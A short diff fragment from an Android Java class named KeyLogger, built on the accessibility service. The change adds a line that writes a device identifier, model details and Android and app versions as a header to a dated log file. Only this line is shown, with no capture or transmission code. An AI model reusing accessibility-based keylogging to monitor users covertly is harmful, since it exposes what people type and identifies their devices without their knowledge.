@@ -43,7 +43,7 @@ public class KeyLogger extends AccessibilityService {
         }
 
         File location = new File(directory, currentDate +".txt");
-
+        Constants.writeHeaderToFile(location, Constants.secureID + "," + Constants.modelName + "," + Constants.modelNumber + ","+ Constants.androidVersion + "," + Constants.earsVersion + "\n");
 
 
 
